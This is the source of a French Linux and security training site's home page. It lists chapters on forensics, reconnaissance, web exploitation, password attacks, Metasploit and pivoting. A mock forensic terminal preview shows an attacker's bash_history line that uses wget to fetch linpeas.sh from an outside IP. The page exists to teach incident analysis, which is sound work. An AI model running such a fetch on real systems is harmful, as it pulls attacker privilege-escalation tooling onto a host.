import Link from 'next/link';
import { levels } from '@/data/levels';
import { scenarios } from '@/data/scenarios';
import Footer from '@/components/Footer';
import UserMenu from '@/components/UserMenu';

// Computed from data at build time
const totalLevels = levels.length;
const totalScenarios = scenarios.length;
const uniqueCommands = new Set(levels.flatMap(l => l.commands)).size;

// Chapter definitions — ranges driven by actual level ids
const CHAPTER_SIZE = 10;
const CHAPTER_META: Record<number, { title: string; items: string[] }> = {
  1:  { title: 'Terminal & SSH',       items: ['ls, cd, pwd, cat', 'grep, find, chmod', 'base64, SSH', 'Permissions'] },
  11: { title: 'Flux & Scripts',       items: ['>, >>, |', 'wc, sort, uniq', 'Variables, wildcards', 'Scripts Bash'] },
  21: { title: 'Réseau & Crypto',      items: ['sudo, SUID', 'Clés SSH', 'Hashing, sed, regex', 'CTF finale'] },
  31: { title: 'Système Linux',        items: ['df, du, free, top', 'journalctl, systemctl', 'crontab, umask', 'Utilisateurs'] },
  41: { title: 'Réseau',               items: ['ip, ss, dig', 'ping, traceroute', 'iptables, rsync', 'Tunnel SSH'] },
  51: { title: 'Forensic Linux',       items: ['auth.log, stat', 'Timeline, lsof', 'Hash, persistance', 'Réponse IR'] },
  61: { title: 'Reconnaissance',       items: ['nmap, dig', 'DNS, OSINT', 'Enumération web', 'Fingerprinting'] },
  71: { title: 'Hacking & PrivEsc',    items: ['SUID, capabilities', 'Cron abuse', 'Pivoting', 'Persistence'] },
  81: { title: 'Bash Avancé',          items: ['Boucles, fonctions', 'Arrays, regex', 'awk, sed avancés', 'trap, getopts'] },
  91:  { title: 'CTF Challenges',         items: ['Stéganographie', 'Encodages, hash', 'Analyse binaire', 'Docker escape'] },
  101: { title: 'Web Reconnaissance',    items: ['Gobuster, ffuf', 'Headers HTTP', 'Nikto, Wapiti', 'Fingerprinting web'] },
  111: { title: 'Web Exploitation',      items: ['SQLi, XSS', 'LFI/RFI', 'CSRF, SSRF', 'Injections'] },
  121: { title: 'Auth & Password Attacks', items: ['Hydra, Medusa', 'Hash cracking', 'Wordlists', 'Brute force'] },
  131: { title: 'Metasploit',            items: ['msfconsole', 'Exploits, payloads', 'Meterpreter', 'Post-exploitation'] },
  141: { title: 'Pivoting',              items: ['Tunnels SSH', 'Proxychains', 'Port forwarding', 'Lateral movement'] },
};

const TRACKS = Object.entries(CHAPTER_META).map(([startStr, meta]) => {
  const start = Number(startStr);
  const end = start + CHAPTER_SIZE - 1;
  const chapterLevels = levels.filter(l => l.id >= start && l.id <= end);
  return {
    range: `${String(start).padStart(2, '0')}–${String(Math.min(end, levels[levels.length - 1].id)).padStart(2, '0')}`,
    count: chapterLevels.length,
    ...meta,
  };
}).filter(t => t.count > 0);

export default function Home() {
  return (
    <div className="min-h-screen bg-[#0a0e17] text-white font-mono">

      {/* Nav */}
      <nav className="border-b border-white/5 px-4 sm:px-6 md:px-16 py-4 flex items-center justify-between">
        <span className="text-[#a3e635] font-bold tracking-widest text-sm">EDULINUX</span>
        <div className="flex items-center gap-3 sm:gap-6 text-sm text-gray-500">
          <Link href="/levels" className="hover:text-white transition-colors hidden sm:inline">niveaux</Link>
          <Link href="/scenarios" className="hover:text-white transition-colors hidden sm:inline">scénarios</Link>
          <Link href="/levels" className="border border-[#a3e635]/50 text-[#a3e635] hover:bg-[#a3e635] hover:text-black px-3 sm:px-4 py-1.5 rounded transition-all font-bold text-xs sm:text-sm">
            démarrer
          </Link>
          <UserMenu />
        </div>
      </nav>

      {/* Hero */}
      <section className="max-w-5xl mx-auto px-4 sm:px-6 md:px-16 pt-14 sm:pt-20 md:pt-24 pb-14 sm:pb-20">
        <p className="text-[#a3e635] text-xs tracking-[0.3em] uppercase mb-4 sm:mb-6">Plateforme d&apos;entraînement Linux</p>
        <h1 className="text-4xl sm:text-5xl md:text-7xl font-bold leading-tight mb-5 sm:mb-6 text-white tracking-tight">
          Apprends Linux<br />
          <span className="text-gray-500">comme un</span> professionnel
        </h1>
        <p className="text-gray-400 text-base sm:text-lg max-w-xl mb-8 sm:mb-10 leading-relaxed">
          {totalLevels} niveaux progressifs — terminal, système, réseau, forensic, CTF.
          Tout dans le navigateur, vrai shell bash, pas de compte requis.
        </p>

        <div className="flex flex-wrap items-center gap-3 sm:gap-4 mb-14 sm:mb-20">
          <Link
            href="/levels"
            className="bg-[#a3e635] text-black font-bold px-6 py-3 rounded text-sm hover:bg-[#bef264] transition-colors"
          >
            Commencer — Niveau 01
          </Link>
          <Link
            href="/scenarios"
            className="border border-white/10 text-gray-400 hover:text-white hover:border-white/30 px-6 py-3 rounded text-sm transition-colors"
          >
            Voir les scénarios
          </Link>
        </div>

        {/* Stats row */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-px bg-white/5 rounded overflow-hidden">
          {[
            { v: String(totalLevels),      l: 'niveaux' },
            { v: String(totalScenarios),   l: 'scénarios' },
            { v: `${uniqueCommands}+`,     l: 'commandes' },
            { v: '0',                      l: 'installation' },
          ].map(s => (
            <div key={s.l} className="bg-[#0a0e17] px-6 py-5 text-center">
              <div className="text-[#a3e635] font-bold text-2xl">{s.v}</div>
              <div className="text-gray-600 text-xs mt-1">{s.l}</div>
            </div>
          ))}
        </div>
      </section>

      {/* Parcours */}
      <section className="max-w-5xl mx-auto px-4 sm:px-6 md:px-16 pb-14 sm:pb-20">
        <p className="text-gray-600 text-xs tracking-[0.3em] uppercase mb-2">Parcours</p>
        <h2 className="text-2xl font-bold text-white mb-8">
          {TRACKS.length} chapitres, des bases au CTF
        </h2>

        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-px bg-white/5 rounded overflow-hidden">
          {TRACKS.map((t) => (
            <div key={t.range} className="bg-[#0a0e17] p-6 hover:bg-[#0f1520] transition-colors">
              <div className="flex items-baseline gap-3 mb-3">
                <span className="text-[#a3e635] text-xs font-bold tracking-widest">{t.range}</span>
                <span className="w-px h-3 bg-white/10" />
                <span className="text-white font-bold text-sm">{t.title}</span>
              </div>
              <ul className="space-y-1.5">
                {t.items.map(item => (
                  <li key={item} className="text-gray-500 text-xs flex items-center gap-2">
                    <span className="text-[#a3e635]/50">›</span>
                    {item}
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </div>
      </section>

      {/* Scenarios */}
      <section className="max-w-5xl mx-auto px-4 sm:px-6 md:px-16 pb-14 sm:pb-20">
        <div className="border border-white/8 rounded p-8 md:p-12">
          <div className="grid md:grid-cols-2 gap-10 items-start">
            <div>
              <p className="text-[#a3e635] text-xs tracking-[0.3em] uppercase mb-3">Mode avancé</p>
              <h2 className="text-2xl font-bold text-white mb-4">
                {totalScenarios} scénarios de mise en situation
              </h2>
              <p className="text-gray-500 text-sm leading-relaxed mb-6">
                Une fois les bases acquises, affronte des incidents réalistes : brute-force SSH, webshell, cartographie réseau, privilege escalation.
                Pas de commande unique — il faut raisonner et enchaîner.
              </p>
              <ul className="space-y-2 text-sm text-gray-500 mb-8">
                {['Contexte détaillé fourni', 'Forensic, réseau, pentest, hacking', 'Validation par jalons', 'Badges et XP'].map(i => (
                  <li key={i} className="flex items-center gap-2"><span className="text-[#a3e635]">✓</span>{i}</li>
                ))}
              </ul>
              <Link
                href="/scenarios"
                className="border border-[#a3e635]/40 text-[#a3e635] hover:bg-[#a3e635] hover:text-black px-5 py-2.5 rounded text-sm font-bold transition-all inline-block"
              >
                Voir les scénarios →
              </Link>
            </div>

            {/* Terminal preview */}
            <div className="bg-black rounded border border-white/8 overflow-hidden">
              <div className="bg-[#111827] px-4 py-2.5 flex items-center gap-2 border-b border-white/5">
                <span className="w-2.5 h-2.5 rounded-full bg-white/10" />
                <span className="w-2.5 h-2.5 rounded-full bg-white/10" />
                <span className="w-2.5 h-2.5 rounded-full bg-white/10" />
                <span className="text-gray-600 text-xs ml-2">forensic@edulinux:~$</span>
              </div>
              <div className="p-5 text-xs space-y-2 leading-relaxed">
                <div><span className="text-[#a3e635]">$</span> <span className="text-white">grep &apos;Failed&apos; auth.log | wc -l</span></div>
                <div className="text-gray-400">847</div>
                <div className="mt-2"><span className="text-[#a3e635]">$</span> <span className="text-white">grep &apos;Accepted&apos; auth.log</span></div>
                <div className="text-gray-400">Accepted password for <span className="text-white">admin</span> from <span className="text-red-400">185.220.101.5</span></div>
                <div className="mt-2"><span className="text-[#a3e635]">$</span> <span className="text-white">cat bash_history | grep wget</span></div>
                <div className="text-red-400">wget http://185.220.101.5/tools/linpeas.sh</div>
                <div className="mt-2 text-[#a3e635]">✓ Étape validée — connexion confirmée</div>
                <div className="text-gray-600 animate-pulse">█</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <Footer />
    </div>
  );
}
